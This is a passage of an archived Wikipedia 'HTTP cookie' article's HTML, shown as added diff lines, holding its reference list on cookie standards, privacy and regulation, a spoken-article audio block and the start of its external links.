+<li id="cite_note-ks-7"><span class="mw-cite-backlink">^ <a href="#cite_ref-ks_7-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-ks_7-1"><sup><i><b>b</b></i></sup></a></span> <span class="reference-text">Kesan, Jey; and Shah, Rajiv&#160;; <a rel="nofollow" class="external text" href="http://papers.ssrn.com/sol3/papers.cfm?abstract_id=597543"><i>Deconstructing Code</i></a>, SSRN.com, chapter II.B (Netscape's cookies), Yale Journal of Law and Technology, 6, 277–389</span></li>
+<li id="cite_note-kristol-8"><span class="mw-cite-backlink">^ <a href="#cite_ref-kristol_8-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-kristol_8-1"><sup><i><b>b</b></i></sup></a></span> <span class="reference-text">Kristol, David; <i>HTTP Cookies: Standards, privacy, and politics</i>, ACM Transactions on Internet Technology, 1(2), 151–198, 2001 <a href="Digital_object_identifier" title="Digital object identifier">doi</a>:<a rel="nofollow" class="external text" href="http://dx.doi.org/10.1145/502152.502153">10.1145/502152.502153</a> (an expanded version is freely available at <a rel="nofollow" class="external text" href="http://arxiv.org/abs/cs.SE/0105018">arXiv:cs/0105018v1 [cs.SE]</a>)</span></li>
+<li id="cite_note-9"><span class="mw-cite-backlink"><b><a href="#cite_ref-9">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://web.archive.org/web/20061207145832/http:/wp.netscape.com/newsref/pr/newsrelease1.html">"Press Release: Netscape Communications Offers New Network Navigator Free On The Internet"</a>. Web.archive.org. Archived from <a rel="nofollow" class="external text" href="http://wp.netscape.com/newsref/pr/newsrelease1.html">the original</a> on 2006-12-07<span class="printonly">. <a rel="nofollow" class="external free" href="http://web.archive.org/web/20061207145832/http:/wp.netscape.com/newsref/pr/newsrelease1.html">http://web.archive.org/web/20061207145832/http://wp.netscape.com/newsref/pr/newsrelease1.html</a></span><span class="reference-accessdate">. Retrieved 2010-05-22</span>.</span></span></li>
+<li id="cite_note-10"><span class="mw-cite-backlink"><b><a href="#cite_ref-10">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://groups.google.com/group/comp.infosystems.www.users/msg/9a210e5f72278328">"Usenet Post by Marc Andreessen: Here it is, world!"</a>. Groups.google.com. 1994-10-13<span class="printonly">. <a rel="nofollow" class="external free" href="http://groups.google.com/group/comp.infosystems.www.users/msg/9a210e5f72278328">http://groups.google.com/group/comp.infosystems.www.users/msg/9a210e5f72278328</a></span><span class="reference-accessdate">. Retrieved 2010-05-22</span>.</span></span></li>
+<li id="cite_note-11"><span class="mw-cite-backlink"><b><a href="#cite_ref-11">^</a></b></span> <span class="reference-text"><span class="citation news">Hardmeier, Sandi (2005-08-25). <a rel="nofollow" class="external text" href="http://www.microsoft.com/windows/IE/community/columns/historyofie.mspx">"The history of Internet Explorer"</a>. Microsoft<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.microsoft.com/windows/IE/community/columns/historyofie.mspx">http://www.microsoft.com/windows/IE/community/columns/historyofie.mspx</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-12"><span class="mw-cite-backlink"><b><a href="#cite_ref-12">^</a></b></span> <span class="reference-text"><span class="citation news">Jackson, T (1996-02-12). "This Bug in Your PC is a Smart Cookie". <i>Financial Times</i>.</span></span></li>
+<li id="cite_note-mscookie-13"><span class="mw-cite-backlink">^ <a href="#cite_ref-mscookie_13-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-mscookie_13-1"><sup><i><b>b</b></i></sup></a></span> <span class="reference-text">Microsoft Support <a rel="nofollow" class="external text" href="http://support.microsoft.com/kb/223799/EN-US">Description of Persistent and Per-Session Cookies in Internet Explorer</a> Article ID 223799, 2007</span></li>
+<li id="cite_note-14"><span class="mw-cite-backlink"><b><a href="#cite_ref-14">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://msdn.microsoft.com/en-us/library/ms526029(v=vs.90).aspx">"Maintaining session state with cookies"</a>. <i>Microsoft Developer Network</i><span class="printonly">. <a rel="nofollow" class="external free" href="http://msdn.microsoft.com/en-us/library/ms526029(v=vs.90).aspx">http://msdn.microsoft.com/en-us/library/ms526029(v=vs.90).aspx</a></span><span class="reference-accessdate">. Retrieved 22 October 2012</span>.</span></span></li>
+<li id="cite_note-15"><span class="mw-cite-backlink"><b><a href="#cite_ref-15">^</a></b></span> <span class="reference-text"><span class="citation web">Rouse, Margaret (September 2005). <a rel="nofollow" class="external text" href="http://searchsoa.techtarget.com/definition/transient-cookie">"Transient cookie (session cookie)"</a>. <i>SearchSOA</i>. TechTarget<span class="printonly">. <a rel="nofollow" class="external free" href="http://searchsoa.techtarget.com/definition/transient-cookie">http://searchsoa.techtarget.com/definition/transient-cookie</a></span><span class="reference-accessdate">. Retrieved 22 October 2012</span>.</span></span></li>
+<li id="cite_note-httponlybrowsers-16"><span class="mw-cite-backlink"><b><a href="#cite_ref-httponlybrowsers_16-0">^</a></b></span> <span class="reference-text">OWASP <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/HttpOnly#Browsers_Supporting_HttpOnly">Browsers Supporting HttpOnly</a></span></li>
+<li id="cite_note-httponlyrfc-17"><span class="mw-cite-backlink">^ <a href="#cite_ref-httponlyrfc_17-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-httponlyrfc_17-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-httponlyrfc_17-2"><sup><i><b>c</b></i></sup></a></span> <span class="reference-text">IETF <a rel="nofollow" class="external text" href="http://tools.ietf.org/html/rfc6265">HTTP State Management Mechanism – Apr, 2011</a> Obsoletes <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc2965">RFC 2965</a></span></li>
+<li id="cite_note-httponlyprotection-18"><span class="mw-cite-backlink"><b><a href="#cite_ref-httponlyprotection_18-0">^</a></b></span> <span class="reference-text"><span class="citation web">Böttiger, Arvid (2011). <a rel="nofollow" class="external text" href="http://bottiger.org/wrote/5-HTTP-Only-cookies-Brought-to-you-by-Internet-Explorer-6">"HTTP-Only cookies - Brought to you by Internet Explorer 6"</a><span class="printonly">. <a rel="nofollow" class="external free" href="http://bottiger.org/wrote/5-HTTP-Only-cookies-Brought-to-you-by-Internet-Explorer-6">http://bottiger.org/wrote/5-HTTP-Only-cookies-Brought-to-you-by-Internet-Explorer-6</a></span>.</span></span></li>
+<li id="cite_note-publicsuffix-19"><span class="mw-cite-backlink"><b><a href="#cite_ref-publicsuffix_19-0">^</a></b></span> <span class="reference-text">"The Public Suffix List is an initiative of Mozilla, ...to Avoid privacy-damaging "supercookies" being set for high-level domain name suffixes..." <a rel="nofollow" class="external text" href="http://publicsuffix.org/">Public Suffix List</a> Mozilla Foundation</span></li>
+<li id="cite_note-bug252342-20"><span class="mw-cite-backlink"><b><a href="#cite_ref-bug252342_20-0">^</a></b></span> <span class="reference-text">Fix cookie domain checks to not allow .co.uk <a rel="nofollow" class="external text" href="https://bugzilla.mozilla.org/show_bug.cgi?id=252342">Mozilla Bug 252342</a> Mozilla 2004</span></li>
+<li id="cite_note-21"><span class="mw-cite-backlink"><b><a href="#cite_ref-21">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://publicsuffix.org/learn/">"Learn more about the Public Suffix List"</a>. <i>Public Suffix List</i><span class="printonly">. <a rel="nofollow" class="external free" href="http://publicsuffix.org/learn/">http://publicsuffix.org/learn/</a></span><span class="reference-accessdate">. Retrieved 28 September 2011</span>.</span></span></li>
+<li id="cite_note-22"><span class="mw-cite-backlink"><b><a href="#cite_ref-22">^</a></b></span> <span class="reference-text"><span class="citation web">Mayer, Jonathan. <a rel="nofollow" class="external text" href="http://cyberlaw.stanford.edu/node/6715">"Tracking the Trackers: Microsoft Advertising"</a>. The Center for Internet and Society<span class="printonly">. <a rel="nofollow" class="external free" href="http://cyberlaw.stanford.edu/node/6715">http://cyberlaw.stanford.edu/node/6715</a></span><span class="reference-accessdate">. Retrieved 28 September 2011</span>.</span></span></li>
+<li id="cite_note-23"><span class="mw-cite-backlink"><b><a href="#cite_ref-23">^</a></b></span> <span class="reference-text"><span class="citation web">Burt, David. <a rel="nofollow" class="external text" href="https://blogs.technet.com/b/privacyimperative/archive/2011/08/19/update-on-the-issue-of-supercookies-used-on-msn.aspx">"Update on the issue of ‘supercookies’ used on MSN"</a><span class="printonly">. <a rel="nofollow" class="external free" href="https://blogs.technet.com/b/privacyimperative/archive/2011/08/19/update-on-the-issue-of-supercookies-used-on-msn.aspx">https://blogs.technet.com/b/privacyimperative/archive/2011/08/19/update-on-the-issue-of-supercookies-used-on-msn.aspx</a></span><span class="reference-accessdate">. Retrieved 28 September 2011</span>.</span></span></li>
+<li id="cite_note-24"><span class="mw-cite-backlink"><b><a href="#cite_ref-24">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://web.archive.org/web/20070805052634/http:/wp.netscape.com/newsref/std/cookie_spec.html">"Persistent client state HTTP cookies: Preliminary specification"</a>. Netscape. c1999. Archived from <a rel="nofollow" class="external text" href="http://wp.netscape.com/newsref/std/cookie_spec.html">the original</a> on 2007-08-05<span class="printonly">. <a rel="nofollow" class="external free" href="http://web.archive.org/web/20070805052634/http:/wp.netscape.com/newsref/std/cookie_spec.html">http://web.archive.org/web/20070805052634/http://wp.netscape.com/newsref/std/cookie_spec.html</a></span>.</span></span></li>
+<li id="cite_note-25"><span class="mw-cite-backlink"><b><a href="#cite_ref-25">^</a></b></span> <span class="reference-text"><a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc2965">RFC 2965</a> – HTTP State Management Mechanism (<a href="Internet_Engineering_Task_Force" title="Internet Engineering Task Force">IETF</a>)</span></li>
+<li id="cite_note-CrumbExample-26"><span class="mw-cite-backlink"><b><a href="#cite_ref-CrumbExample_26-0">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://msdn2.microsoft.com/en-us/library/ms533693.aspx">"Cookie Property"</a>. <i>MSDN</i>. Microsoft<span class="printonly">. <a rel="nofollow" class="external free" href="http://msdn2.microsoft.com/en-us/library/ms533693.aspx">http://msdn2.microsoft.com/en-us/library/ms533693.aspx</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-27"><span class="mw-cite-backlink"><b><a href="#cite_ref-27">^</a></b></span> <span class="reference-text"><span class="citation news">Shannon, Ross (2007-02-26). <a rel="nofollow" class="external text" href="http://www.yourhtmlsource.com/javascript/cookies.html">"Cookies&#160;— set and retrieve information about your readers"</a>. HTMLSource<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.yourhtmlsource.com/javascript/cookies.html">http://www.yourhtmlsource.com/javascript/cookies.html</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-Sharing_Cookies_Between_Multiple_Domains-28"><span class="mw-cite-backlink"><b><a href="#cite_ref-Sharing_Cookies_Between_Multiple_Domains_28-0">^</a></b></span> <span class="reference-text"><span class="citation web">Innovative, Php (2011-09-02). <a rel="nofollow" class="external text" href="http://www.innovativephp.com/sharing-cookies-across-multiple-domains-hosted-on-different-servers/">"Sharing Cookies Between Multiple Domains"</a>. InnovativePhp.<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.innovativephp.com/sharing-cookies-across-multiple-domains-hosted-on-different-servers/">http://www.innovativephp.com/sharing-cookies-across-multiple-domains-hosted-on-different-servers/</a></span><span class="reference-accessdate">. Retrieved 2011-09-02</span>.</span></span></li>
+<li id="cite_note-29"><span class="mw-cite-backlink"><b><a href="#cite_ref-29">^</a></b></span> <span class="reference-text"><a rel="nofollow" class="external text" href="http://tools.ietf.org/html/rfc2616#section-3.3.1">RFC 2616 - Hypertext Transfer Protocol - HTTP/1.1</a></span></li>
+<li id="cite_note-Symantec-2007-2nd-exec-30"><span class="mw-cite-backlink"><b><a href="#cite_ref-Symantec-2007-2nd-exec_30-0">^</a></b></span> <span class="reference-text"><span class="citation Journal">(PDF) <a rel="nofollow" class="external text" href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_exec_summary_internet_security_threat_report_xiii_04-2008.en-us.pdf"><i>Symantec Internet Security Threat Report: Trends for July–December 2007 (Executive Summary)</i></a>. <b>XIII</b>. Symantec Corp.. April 2008. pp.&#160;1–3<span class="printonly">. <a rel="nofollow" class="external free" href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_exec_summary_internet_security_threat_report_xiii_04-2008.en-us.pdf">http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_exec_summary_internet_security_threat_report_xiii_04-2008.en-us.pdf</a></span><span class="reference-accessdate">. Retrieved May 11, 2008</span>.</span></span></li>
+<li id="cite_note-31"><span class="mw-cite-backlink"><b><a href="#cite_ref-31">^</a></b></span> <span class="reference-text"><span class="citation web">Whalen, David (June 8, 2002). <a rel="nofollow" class="external text" href="http://www.cookiecentral.com/faq/">"The Unofficial Cookie FAQ v2.6"</a>. Cookie Central<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.cookiecentral.com/faq/">http://www.cookiecentral.com/faq/</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-32"><span class="mw-cite-backlink"><b><a href="#cite_ref-32">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://grack.com/blog/2010/01/06/3rd-party-cookies-dom-storage-and-privacy/">"3rd-Party Cookies, DOM Storage and Privacy"</a>. grack.com: Matt Mastracci's blog. January 6, 2010<span class="printonly">. <a rel="nofollow" class="external free" href="http://grack.com/blog/2010/01/06/3rd-party-cookies-dom-storage-and-privacy/">http://grack.com/blog/2010/01/06/3rd-party-cookies-dom-storage-and-privacy/</a></span><span class="reference-accessdate">. Retrieved 2010-09-20</span>.</span></span></li>
+<li id="cite_note-microsoft2007-33"><span class="mw-cite-backlink"><b><a href="#cite_ref-microsoft2007_33-0">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://support.microsoft.com/kb/283185">"How to Manage Cookies in Internet Explorer 6"</a>. Microsoft. December 18, 2007<span class="printonly">. <a rel="nofollow" class="external free" href="http://support.microsoft.com/kb/283185">http://support.microsoft.com/kb/283185</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-34"><span class="mw-cite-backlink"><b><a href="#cite_ref-34">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://support.mozilla.com/en-US/kb/Clearing+Private+Data#top">"Clearing private data"</a>. <i>Firefox Support Knowledge base</i>. Mozilla. 16 September 2008<span class="printonly">. <a rel="nofollow" class="external free" href="http://support.mozilla.com/en-US/kb/Clearing+Private+Data#top">http://support.mozilla.com/en-US/kb/Clearing+Private+Data#top</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-35"><span class="mw-cite-backlink"><b><a href="#cite_ref-35">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://www.google.com/support/chrome/bin/answer.py?hl=en&answer=95582">"Clear Personal Information&#160;: Clear browsing data"</a>. <i>Google Chrome Help</i>. Google<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.google.com/support/chrome/bin/answer.py?hl=en&answer=95582">http://www.google.com/support/chrome/bin/answer.py?hl=en&amp;answer=95582</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-36"><span class="mw-cite-backlink"><b><a href="#cite_ref-36">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://www.google.com/support/chrome/bin/answer.py?hl=en&answer=95626">"Clear Personal Information: Delete cookies"</a>. <i>Google Chrome Help</i>. Google<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.google.com/support/chrome/bin/answer.py?hl=en&answer=95626">http://www.google.com/support/chrome/bin/answer.py?hl=en&amp;answer=95626</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-37"><span class="mw-cite-backlink"><b><a href="#cite_ref-37">^</a></b></span> <span class="reference-text">Miyazaki, Anthony D. (2008), “Online Privacy and the Disclosure of Cookie Use: Effects on Consumer Trust and Anticipated Patronage,” Journal of Public Policy &amp; Marketing, 23 (Spring), 19–33</span></li>
+<li id="cite_note-38"><span class="mw-cite-backlink"><b><a href="#cite_ref-38">^</a></b></span> <span class="reference-text"><span class="citation news"><a rel="nofollow" class="external text" href="http://www.cbsnews.com/stories/2002/03/20/tech/main504131.shtml">"CIA Caught Sneaking Cookies"</a>. <i>CBS News</i>. 2002-03-20<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.cbsnews.com/stories/2002/03/20/tech/main504131.shtml">http://www.cbsnews.com/stories/2002/03/20/tech/main504131.shtml</a></span>.</span></span></li>
+<li id="cite_note-39"><span class="mw-cite-backlink"><b><a href="#cite_ref-39">^</a></b></span> <span class="reference-text"><span class="citation news"><a rel="nofollow" class="external text" href="http://www.nytimes.com/2005/12/29/national/29cookies.html">"Spy Agency Removes Illegal Tracking Files"</a>. <i>The New York Times</i>. 2005-12-29<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.nytimes.com/2005/12/29/national/29cookies.html">http://www.nytimes.com/2005/12/29/national/29cookies.html</a></span>.</span></span></li>
+<li id="cite_note-JISC-40"><span class="mw-cite-backlink"><b><a href="#cite_ref-JISC_40-0">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://www.jisclegal.ac.uk/ManageContent/ViewDetail/ID/1347/EU-Cookie-Directive--Directive-2009136EC.aspx">"EU Cookie Directive - Directive 2009/136/EC"</a>. JISC Legal Information<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.jisclegal.ac.uk/ManageContent/ViewDetail/ID/1347/EU-Cookie-Directive--Directive-2009136EC.aspx">http://www.jisclegal.ac.uk/ManageContent/ViewDetail/ID/1347/EU-Cookie-Directive--Directive-2009136EC.aspx</a></span><span class="reference-accessdate">. Retrieved 31 October 2012</span>.</span></span></li>
+<li id="cite_note-ICO_reference-41"><span class="mw-cite-backlink">^ <a href="#cite_ref-ICO_reference_41-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-ICO_reference_41-1"><sup><i><b>b</b></i></sup></a> <a href="#cite_ref-ICO_reference_41-2"><sup><i><b>c</b></i></sup></a></span> <span class="reference-text"><span class="citation book"><a rel="nofollow" class="external text" href="http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/~/media/documents/library/Privacy_and_electronic/Practical_application/cookies_guidance_v3.ashx"><i>Privacy and Electronic Communications Regulations</i></a>. Information Commissioner's Office. 2012<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/~/media/documents/library/Privacy_and_electronic/Practical_application/cookies_guidance_v3.ashx">http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/~/media/documents/library/Privacy_and_electronic/Practical_application/cookies_guidance_v3.ashx</a></span>.</span></span></li>
+<li id="cite_note-42"><span class="mw-cite-backlink"><b><a href="#cite_ref-42">^</a></b></span> <span class="reference-text"><span class="citation Journal"><a rel="nofollow" class="external text" href="http://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=CELEX:31995L0046:en:HTML"><i>Directive 95/46/EC of the European Parliament and of the Council of 24 October 1995 on the protection of individuals with regard to the processing of personal data and on the free movement of such data</i></a>. 1995-11-23. pp.&#160;P. 0031–0050<span class="printonly">. <a rel="nofollow" class="external free" href="http://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=CELEX:31995L0046:en:HTML">http://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=CELEX:31995L0046:en:HTML</a></span><span class="reference-accessdate">. Retrieved 31 October 2012</span>.</span></span></li>
+<li id="cite_note-43"><span class="mw-cite-backlink"><b><a href="#cite_ref-43">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/cookies.aspx">"New EU cookie law (e-Privacy Directive)"</a><span class="printonly">. <a rel="nofollow" class="external free" href="http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/cookies.aspx">http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/cookies.aspx</a></span><span class="reference-accessdate">. Retrieved 31 October 2012</span>.</span></span></li>
+<li id="cite_note-44"><span class="mw-cite-backlink"><b><a href="#cite_ref-44">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://www.wired.co.uk/news/archive/2012-05/24/eu-cookie-law-moaning">"EU cookie law: stop whining and just get on with it"</a><span class="printonly">. <a rel="nofollow" class="external free" href="http://www.wired.co.uk/news/archive/2012-05/24/eu-cookie-law-moaning">http://www.wired.co.uk/news/archive/2012-05/24/eu-cookie-law-moaning</a></span><span class="reference-accessdate">. Retrieved 31 October 2012</span>.</span></span></li>
+<li id="cite_note-nyt-bits-45"><span class="mw-cite-backlink">^ <a href="#cite_ref-nyt-bits_45-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-nyt-bits_45-1"><sup><i><b>b</b></i></sup></a></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://bits.blogs.nytimes.com/2010/09/17/a-loophole-big-enough-for-a-cookie-to-fit-through/">"A Loophole Big Enough for a Cookie to Fit Through"</a>. <i>Bits</i>. The New York Times<span class="printonly">. <a rel="nofollow" class="external free" href="http://bits.blogs.nytimes.com/2010/09/17/a-loophole-big-enough-for-a-cookie-to-fit-through/">http://bits.blogs.nytimes.com/2010/09/17/a-loophole-big-enough-for-a-cookie-to-fit-through/</a></span><span class="reference-accessdate">. Retrieved 31 January 2013</span>.</span></span></li>
+<li id="cite_note-howtoblock-46"><span class="mw-cite-backlink"><b><a href="#cite_ref-howtoblock_46-0">^</a></b></span> <span class="reference-text"><span class="citation news">Pegoraro, Rob (July 17, 2005). <a rel="nofollow" class="external text" href="http://www.washingtonpost.com/wp-dyn/content/article/2005/07/16/AR2005071600111.html">"How to Block Tracking Cookies"</a>. Washington Post. p.&#160;F07<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.washingtonpost.com/wp-dyn/content/article/2005/07/16/AR2005071600111.html">http://www.washingtonpost.com/wp-dyn/content/article/2005/07/16/AR2005071600111.html</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-certificatehack-47"><span class="mw-cite-backlink"><b><a href="#cite_ref-certificatehack_47-0">^</a></b></span> <span class="reference-text">Wired <a rel="nofollow" class="external text" href="http://www.wired.com/threatlevel/2011/03/comodo-compromise/">Hack Obtains 9 Bogus Certificates for Prominent Websites</a></span></li>
+<li id="cite_note-48"><span class="mw-cite-backlink"><b><a href="#cite_ref-48">^</a></b></span> <span class="reference-text"><span class="citation news">Fielding, Roy (2000). <a rel="nofollow" class="external text" href="http://roy.gbiv.com/pubs/dissertation/evaluation.htm">"Fielding Dissertation: CHAPTER 6: Experience and Evaluation"</a><span class="printonly">. <a rel="nofollow" class="external free" href="http://roy.gbiv.com/pubs/dissertation/evaluation.htm">http://roy.gbiv.com/pubs/dissertation/evaluation.htm</a></span><span class="reference-accessdate">. Retrieved 2010-10-14</span>.</span></span></li>
+<li id="cite_note-49"><span class="mw-cite-backlink"><b><a href="#cite_ref-49">^</a></b></span> <span class="reference-text"><span class="citation web">Tilkov, Stefan (July 2, 2008). <a rel="nofollow" class="external text" href="http://www.infoq.com/articles/rest-anti-patterns">"REST Anti-Patterns"</a>. InfoQ<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.infoq.com/articles/rest-anti-patterns">http://www.infoq.com/articles/rest-anti-patterns</a></span><span class="reference-accessdate">. Retrieved 2009-01-04</span>.</span></span></li>
+<li id="cite_note-Mena2011-50"><span class="mw-cite-backlink">^ <a href="#cite_ref-Mena2011_50-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-Mena2011_50-1"><sup><i><b>b</b></i></sup></a></span> <span class="reference-text"><span class="citation book">Mena, Jesús (2011). <i>Machine Learning Forensics for Law Enforcement, Security, and Intelligence</i>. Boca Raton, FL: CRC Press (Taylor &amp; Francis Group). <a href="International_Standard_Book_Number" title="International Standard Book Number">ISBN</a>&#160;<a href="Special_BookSources/9-781-4398-6069-4" title="Special:BookSources/9-781-4398-6069-4">9-781-4398-6069-4</a>.</span></span></li>
+<li id="cite_note-51"><span class="mw-cite-backlink"><b><a href="#cite_ref-51">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://www.thomasfrank.se/sessionvars.html">"ThomasFrank.se"</a>. ThomasFrank.se<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.thomasfrank.se/sessionvars.html">http://www.thomasfrank.se/sessionvars.html</a></span><span class="reference-accessdate">. Retrieved 2010-05-22</span>.</span></span></li>
+</ol>
+</div>
+<p><span class="citation foldoc">This article is based on material taken from the <a href="Free_On-line_Dictionary_of_Computing" title="Free On-line Dictionary of Computing">Free On-line Dictionary of Computing</a> prior to 1 November 2008 and incorporated under the "relicensing" terms of the <a href="GNU_Free_Documentation_License" title="GNU Free Documentation License">GFDL</a>, version 1.3 or later.</span></p>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=42.php.html" title="Edit section: External links">edit</a>]</span> <span class="mw-headline" id="External_links">External links</span></h2>
+<div id="section_SpokenWikipedia" class="infobox sisterproject plainlinks haudio">
+<div style="text-align: center; white-space:nowrap"><b>Listen to this article</b> (<a href="../File_HTTP_cookie.ogg" title="File:HTTP cookie.ogg">info/dl</a>)
+<div class="center">
+<div class="floatnone">
+<div class="mediaContainer" style="position:relative;display:block;width:200px"><audio id="mwe_player_1" style="width:200px;height:23px" poster="//bits.wikimedia.org/static-1.21wmf9/skins/common/images/icons/fileicon-ogg.png" controls="" preload="none" class="kskin" data-durationhint="2637.1715192744" data-startoffset="0" data-mwtitle="HTTP_cookie.ogg" data-mwprovider="wikimediacommons"><source src="//upload.wikimedia.org/wikipedia/commons/1/1e/HTTP_cookie.ogg" type="audio/ogg; codecs=&quot;vorbis&quot;" data-title="Original ogg, 0 × 0 (70kbps)" data-shorttitle="Ogg source" data-width="0" data-height="0" data-bandwidth="69720"></source>Sorry, your browser either has JavaScript disabled or does not have any supported player.<br />
+You can <a href="http://upload.wikimedia.org/wikipedia/commons/1/1e/HTTP_cookie.ogg">download the clip</a> or <a href="http://www.mediawiki.org/wiki/Extension:TimedMediaHandler/Client_download">download a player</a> to play the clip in your browser.</audio></div>
+</div>
+</div>
+</div>
+<div style="float: left; margin-left: 5px;">
+<div class="floatnone"><img alt="" src="http://upload.wikimedia.org/wikipedia/commons/thumb/4/47/Sound-icon.svg/45px-Sound-icon.svg.png" width="45" height="34" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/4/47/Sound-icon.svg/68px-Sound-icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/4/47/Sound-icon.svg/90px-Sound-icon.svg.png 2x" /></div>
+</div>
+<div style="font-size: xx-small; line-height: 1.6em; margin-left: 60px;">This audio file was created from a revision of the "<span class="fn">HTTP cookie</span>" article dated 2011-10-19, and does not reflect subsequent edits to the article. (<a href="Wikipedia_Media_help" title="Wikipedia:Media help">Audio help</a>)</div>
+<div style="text-align: center; clear: both"><b><a href="Wikipedia_Spoken_articles" title="Wikipedia:Spoken articles">More spoken articles</a></b></div>
+</div>
+<div style="right:30px; display:none;" class="metadata topicon" id="spoken-icon"><a href="../File_HTTP_cookie.ogg" title="File:HTTP cookie.ogg"><img alt="Sound-icon.svg" src="http://upload.wikimedia.org/wikipedia/commons/thumb/4/47/Sound-icon.svg/15px-Sound-icon.svg.png" width="15" height="11" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/4/47/Sound-icon.svg/23px-Sound-icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/4/47/Sound-icon.svg/30px-Sound-icon.svg.png 2x" /></a></div>
+<ul>
+<li><a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc6265">RFC 6265</a> – the official specification for HTTP cookies</li>
+<li><a rel="nofollow" class="external text" href="http://www.howstuffworks.com/cookie.htm">How Internet Cookies Work</a> at <a href="HowStuffWorks" title="HowStuffWorks">HowStuffWorks</a></li>
+<li><a rel="nofollow" class="external text" href="http://www.microsoft.com/info/cookies.mspx">Information About Cookies</a> from <a href="Microsoft" title="Microsoft">Microsoft</a></li>
+<li><a rel="nofollow" class="external text" href="http://epic.org/privacy/internet/cookies/">Cookies</a> at the Electronic Privacy Information Center (EPIC)</li>
+<li><a rel="nofollow" class="external text" href="http://cpe.njit.edu/dlnotes/CIS/CIS350/TakingTheByteOutOfCookies.pdf">Taking the Byte Out of Cookies: Privacy, Consent, and the Web</a> (PDF)</li>
+<li><a rel="nofollow" class="external text" href="http://archive.cabinetoffice.gov.uk/e-government/resources/handbook/html/4-7.asp">Web handbook – Cookies</a> from Delivery And Transformation Group, Cabinet Office, UK</li>
+<li><a rel="nofollow" class="external text" href="http://www.comscore.com/press/release.asp?press=1389">Cookie-Based Counting Overstates Size of Web Site Audiences</a> at ComScore</li>
+<li><a rel="nofollow" class="external text" href="http://www.pbs.org/mediashift/2007/11/dont_tread_on_our_cookiesthe_w.html">Don’t Tread on Our Cookies – The Web Privacy Manifesto</a> at PBS</li>
